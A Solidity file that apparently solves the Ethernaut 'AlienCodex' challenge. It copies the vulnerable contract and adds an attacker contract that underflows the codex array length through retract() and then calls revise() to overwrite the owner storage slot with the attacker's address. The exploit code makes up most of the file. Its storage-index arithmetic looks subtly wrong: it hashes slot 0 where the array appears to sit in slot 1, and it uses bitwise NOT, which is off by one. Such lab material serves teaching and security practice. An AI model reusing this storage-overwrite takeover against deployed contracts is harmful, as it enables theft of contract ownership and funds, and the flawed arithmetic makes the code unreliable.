// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

contract ethernautAlienCodex {
    bytes public test1;
    function solve() public returns (bytes32,bytes32,bytes32) {
        address _contractAddr = 0x93f8dddd876c7dBE3323723500e83E202A7C96CC;
        bytes32 _data = bytes32(uint256(address(0x798349E06c67272465123B91bd88C5d19b8c7878)));
        AlienCodex(_contractAddr).make_contact();
        AlienCodex(_contractAddr).retract(); //Underflow, all storage is accessible
        uint256 index = ~uint256(keccak256(abi.encode(0))); //We calculate the index of "address owner"
        //return (bytes32(index), bytes32(~index), bytes32(index - uint256(keccak256(abi.encode(0)))));

        AlienCodex(_contractAddr).revise(index, _data); //Set owner as me
    }

}
